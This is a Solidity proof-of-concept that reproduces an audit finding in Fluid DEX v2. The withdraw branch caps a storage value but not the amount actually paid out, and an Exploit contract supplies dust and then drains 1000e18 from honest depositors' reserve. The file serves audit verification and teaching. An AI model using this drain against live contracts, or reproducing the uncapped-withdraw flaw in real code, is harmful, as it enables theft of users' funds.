// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Fluid DEX v2 finding 65649 (H-1):
// "User can steal funds using `_processNormalSupplyAction` uncapped withdrawal".
//
// Real audited source (the vulnerable WITHDRAW branch is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2026-01-fluid-dex-v2
//   file   fluid-contracts/contracts/protocols/moneyMarket/core/operateModule/helpers.sol
//   fn     _processNormalSupplyAction  (withdraw branch, L446-L481)
//   report github.com/sherlock-audit/2026-01-fluid-dex-v2-judging/issues/610
//
// Root cause: the withdraw branch caps `withdrawAmountRaw_` (used only for the
// position-storage update and health factor) to the user's `tokenRawSupply_`
// (the @> line), but it NEVER re-caps `supplyAmount_` — the value actually
// handed to `LIQUIDITY.operate` at the end of the branch. So the final
// `LIQUIDITY.operate(token_, supplyAmount_, ...)` transfers the FULL, uncapped
// `supplyAmount_` to the user. A user who supplied 1e6 can withdraw 1000e18,
// draining other users' liquidity.
//
// The vulnerable arithmetic is byte-for-byte the on-chain source: the minimal
// `LC` library below recreates `LC.EXCHANGE_PRICES_PRECISION` so the marked line
// is identical to the audited contract. Non-vulnerable dependencies
// (`LIQUIDITY.operate`, exchange-price read, storage update, health/limit
// checks) are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Recreates the Fluid `LC` (LiquidityCalcs / constants) member used on the
///      vulnerable line so the reproduced expression is verbatim.
library LC {
    uint256 internal constant EXCHANGE_PRICES_PRECISION = 1e12;
}

/// @dev Faithful minimal ERC20 double for the supplied/withdrawn token.
contract MiniToken {
    string public name = "Fluid Money Market Asset";
    string public symbol = "fmmUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful double of the Fluid LIQUIDITY layer. On a supply (amount_ > 0)
///      it pulls `amount_` tokens from the money market into its reserve; on a
///      withdraw (amount_ < 0) it pays `uint256(-amount_)` tokens to `to_`.
///      Returns the fixed supply exchange price (1e12) used in the finding's
///      worked example. This is where the uncapped `supplyAmount_` is paid out.
contract Liquidity {
    MiniToken public token;
    uint256 public constant SUPPLY_EXCHANGE_PRICE = 1e12;

    constructor(MiniToken t) {
        token = t;
    }

    function operate(
        address, // token_
        int256 amount_,
        uint256, // withdrawAmount / unused here
        address to_,
        address, // from_
        bytes calldata // callbackData_
    ) external returns (uint256 supplyExchangePrice_, uint256 borrowExchangePrice_) {
        if (amount_ > 0) {
            // supply: pull the deposited tokens from the money market into the reserve
            token.transferFrom(msg.sender, address(this), uint256(amount_));
        } else if (amount_ < 0) {
            // withdraw: pay the (uncapped) requested amount to the recipient
            token.transfer(to_, uint256(-amount_));
        }
        return (SUPPLY_EXCHANGE_PRICE, 0);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the withdraw branch of `_processNormalSupplyAction`
// is reproduced VERBATIM from the audited source.
// ─────────────────────────────────────────────────────────────────────────────
contract MoneyMarket {
    Liquidity internal LIQUIDITY;
    MiniToken internal token;

    // Simplified position storage: user => tokenRawSupply_ (the amount previously supplied).
    mapping(address => uint256) public tokenRawSupply;

    constructor(Liquidity liq_, MiniToken token_) {
        LIQUIDITY = liq_;
        token = token_;
        token_.approve(address(liq_), type(uint256).max);
    }

    // ── faithful doubles for the non-vulnerable helpers the branch calls ──
    function _getExchangePrices(address) internal pure returns (uint256 supplyExchangePrice_, uint256) {
        return (1e12, 0); // matches the finding's "supplyExchangePrice is 1e12"
    }

    function _verifyAmountLimits(int256) internal pure {}

    function _checkHf(uint256, bool) internal pure {}

    function _updateStorageForWithdraw(address user_, uint256 tokenRawSupply_, uint256 withdrawAmountRaw_) internal {
        // reduce the position by the (capped) raw amount, as the real storage update does
        tokenRawSupply[user_] = tokenRawSupply_ - withdrawAmountRaw_;
    }

    /// @notice Faithful supply path — populates the caller's `tokenRawSupply_`.
    ///         (Not the vulnerable branch; kept minimal.)
    function supply(uint256 amount_) external {
        token.transferFrom(msg.sender, address(this), amount_);
        (uint256 supplyExchangePrice_, ) = LIQUIDITY.operate(
            address(token), int256(amount_), 0, address(0), address(0), abi.encode(uint256(0), uint256(0))
        );
        // rounded down so protocol is on the winning side
        uint256 supplyAmountRaw_ = ((amount_ * LC.EXCHANGE_PRICES_PRECISION) - 1) / supplyExchangePrice_;
        if (supplyAmountRaw_ > 0) supplyAmountRaw_ -= 1;
        tokenRawSupply[msg.sender] += supplyAmountRaw_;
    }

    /// @notice Withdraw path — the branch below is VERBATIM from the audited
    ///         `_processNormalSupplyAction` (helpers.sol L446-L481).
    function withdraw(int256 supplyAmount_, address to_) external {
        address token_ = address(token);
        uint256 tokenRawSupply_ = tokenRawSupply[msg.sender];

        // User is withdrawing
        (uint256 supplyExchangePrice_, ) = _getExchangePrices(token_);

        // Check if user wants to withdraw all
        uint256 withdrawAmountRaw_;
        if (supplyAmount_ == type(int256).min) {
            withdrawAmountRaw_ = tokenRawSupply_; // Full amount will be withdrawn
            // Calculate the actual withdraw amount
            // rounded down so protocol is on the winning side
            uint256 withdrawAmount_ = ((tokenRawSupply_ * supplyExchangePrice_) - 1) / LC.EXCHANGE_PRICES_PRECISION;
            if (withdrawAmount_ > 0) withdrawAmount_ -= 1;
            supplyAmount_ = -int256(withdrawAmount_);
        } else {
            withdrawAmountRaw_ = (((uint256(-supplyAmount_) * LC.EXCHANGE_PRICES_PRECISION) + 1) / supplyExchangePrice_) + 1; // rounded up so protocol is on the winning side
            if (withdrawAmountRaw_ > tokenRawSupply_) withdrawAmountRaw_ = tokenRawSupply_; // @> VULN: caps withdrawAmountRaw_ (used only for storage/health) but never re-caps supplyAmount_, the value actually transferred below
        }

        _verifyAmountLimits(supplyAmount_);

        _updateStorageForWithdraw(msg.sender, tokenRawSupply_, withdrawAmountRaw_);

        // Check the health factor of the position
        _checkHf(0, true);

        // Give the withdraw to the user
        LIQUIDITY.operate(token_, supplyAmount_, 0, to_, address(0), abi.encode(uint256(0), uint256(0)));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: supply a dust amount (1e6), then withdraw 1000e18 and prove
// the money market pays out the full uncapped amount, draining the reserve.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    Liquidity public liquidity;
    MoneyMarket public vuln;

    uint256 public suppliedByAttacker; // dust the attacker actually supplied
    uint256 public withdrawnByAttacker; // what the vulnerable branch paid out
    uint256 public profit; // net drained
    uint256 public reserveDrained;

    uint256 internal constant DUST_SUPPLY = 1e6; // finding's example: user supplies 1e6
    uint256 internal constant WITHDRAW_AMOUNT = 1000e18; // and withdraws 1000e18
    uint256 internal constant OTHER_LIQUIDITY = 2000e18; // other users' deposits in the reserve

    constructor() {
        token = new MiniToken(); // child nonce 1
        liquidity = new Liquidity(token); // child nonce 2
        vuln = new MoneyMarket(liquidity, token); // child nonce 3 (VULN)

        // other honest depositors' liquidity sits in the reserve
        token.mint(address(liquidity), OTHER_LIQUIDITY);
    }

    function run() external {
        // attacker is funded with only the dust supply
        token.mint(address(this), DUST_SUPPLY);
        token.approve(address(vuln), type(uint256).max);

        uint256 reserveBefore = token.balanceOf(address(liquidity));

        // 1) supply a dust amount -> tokenRawSupply becomes ~999998
        vuln.supply(DUST_SUPPLY);
        suppliedByAttacker = DUST_SUPPLY;

        // 2) withdraw 1000e18 (>> supplied). withdrawAmountRaw_ is capped to the
        //    position for storage, but supplyAmount_ is NOT, so 1000e18 is paid out.
        uint256 balBefore = token.balanceOf(address(this));
        vuln.withdraw(-int256(WITHDRAW_AMOUNT), address(this));
        withdrawnByAttacker = token.balanceOf(address(this)) - balBefore;

        reserveDrained = reserveBefore - token.balanceOf(address(liquidity)) + DUST_SUPPLY;
        profit = token.balanceOf(address(this)); // ends holding the drained tokens

        // harm: withdrew far more than supplied, draining honest depositors' reserve
        require(withdrawnByAttacker == WITHDRAW_AMOUNT, "did not receive uncapped withdrawal");
        require(profit > DUST_SUPPLY * 1000, "no meaningful drain");
    }
}
